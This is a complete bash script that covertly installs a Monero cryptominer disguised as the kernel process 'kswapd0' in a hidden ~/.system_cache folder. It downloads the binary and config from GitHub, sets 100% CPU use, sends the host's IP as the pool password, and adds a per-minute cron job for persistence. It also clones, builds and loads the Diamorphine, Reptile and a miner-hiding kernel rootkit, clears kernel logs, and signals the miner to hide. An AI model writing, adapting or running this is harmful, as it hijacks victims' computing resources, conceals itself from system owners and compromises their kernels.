#!/bin/bash

chattr -i $HOME/.system_cache/*
chattr -i $HOME/.system_cache/

# Script to start Monero Ocean Miner and manage files

# Create directory for the files
mkdir -p "$HOME/.system_cache/"

# Paths to the required files
KSWAPD0="$HOME/.system_cache/kswapd0"
CONFIG_JSON="$HOME/.system_cache/config.json"

# Terminate processes related to the specific kswapd0
pkill -f "$KSWAPD0 --config=$CONFIG_JSON"

# Check if the files exist and download if not
if [ -f "$KSWAPD0" ] && [ -x "$KSWAPD0" ]; then
    echo "kswapd0 exists and is executable."
else
    echo "kswapd0 does not exist or is not executable. Downloading..."
    curl -L -o "$KSWAPD0" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/kswapd0
    chmod +x "$KSWAPD0"
fi

if [ -f "$CONFIG_JSON" ]; then
    echo "config.json exists."
else
    echo "config.json does not exist. Downloading..."
    curl -L -o "$CONFIG_JSON" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
fi

echo "PASS..."
#PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
#PASS=`hostname`
#PASS=`sh -c "IP=\$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'); nslookup \$IP | grep 'name =' | awk '{print \$NF}'"`
PASS=`sh -c "(curl -4 ip.sb)"`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS:$EMAIL"
fi
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.system_cache/config.json


echo "sed"
#sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/.system_cache/config.json
#sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.system_cache/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.system_cache/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.system_cache/config.json
#sed -i 's#"log-file": *null,#"log-file": "'$HOME/.swapd/swapd.log'",#' $HOME/.system_cache/config.json
#sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.system_cache/config.json
sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.system_cache/config.json
sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.system_cache/config.json
sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' $HOME/.system_cache/config.json
sed -i 's/"background": *false,/"background": true,/' $HOME/.system_cache/config.json


# Run kswapd0 if no other process with the specific configuration is running
if ! pgrep -f "$HOME/.system_cache/kswapd0 --config=$HOME/.system_cache/config.json" > /dev/null; then
    echo "kswapd0 not started. Starting it..."
    "$HOME/.system_cache/kswapd0" --config="$HOME/.system_cache/config.json" &
else
    echo "kswapd0 is already running."
fi

# Create the check script
cat <<'EOF' >"$HOME/.system_cache/check_and_start.sh"
#!/bin/bash
lockfile="$HOME/.system_cache/check_and_start.lock"

# Locking-Mechanismus mit flock
exec 200>"$lockfile"
flock -n 200 || exit 1

if ! pgrep -f "$HOME/.system_cache/kswapd0"; then
  "$HOME/.system_cache/kswapd0 --config=$HOME/.system_cache/config.json"
fi
EOF

# Make the check script executable
chmod +x "$HOME/.system_cache/check_and_start.sh"

# Nur einen Cronjob hinzufügen, falls nicht vorhanden
(crontab -l 2>/dev/null | grep -v "check_and_start.sh"; echo "* * * * * $HOME/.system_cache/check_and_start.sh") | crontab -



## Cron job setup: remove outdated lines and add the new command
#CRON_JOB="*/5 * * * * $HOME/.system_cache/check_and_start.sh"
#(crontab -l 2>/dev/null | grep -v -E '(out dat|check_and_start.sh)'; echo "$CRON_JOB") | crontab -

echo "[*] make toolZ, Diamorphine"
          cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; yum install linux-generic linux-headers-$(uname -r) kernel kernel-devel kernel-firmware kernel-tools kernel-modules kernel-headers git make gcc msr-tools -y ; apt-get update -y ; apt-get reinstall kmod ; apt-get install linux-generic linux-headers-$(uname -r) git make gcc msr-tools -y ;  zypper update -y ; zypper install linux-generic linux-headers-$(uname -r) git make gcc msr-tools -y ; git clone https://github.com/m0nad/Diamorphine ; cd Diamorphine/ ; make ; insmod diamorphine.ko ; dmesg -C ; kill -63 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
    
    echo "[*] Reptile..."
        cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; apt-get update -y ; apt-get install build-essential linux-headers-$(uname -r) git make gcc msr-tools libncurses-dev -y ; yum update -y; yum install -y ncurses-devel ; git clone https://github.com/f0rb1dd3n/Reptile/ && cd Reptile ; make defconfig ; make ; make install ; dmesg -C ; /reptile/reptile_cmd hide ;  kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
    
    echo "[*] hide crypto miner."
        cd /tmp ; cd .X11-unix ; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit && cd hiding-cryptominers-linux-rootkit/ && make ; dmesg -C && insmod rootkit.ko && dmesg ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` ; rm -rf hiding-cryptominers-linux-rootkit/
    
kill -31 $(pgrep -f -u root config.json) 
kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
kill -31 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`
kill -63 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
kill -63 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`

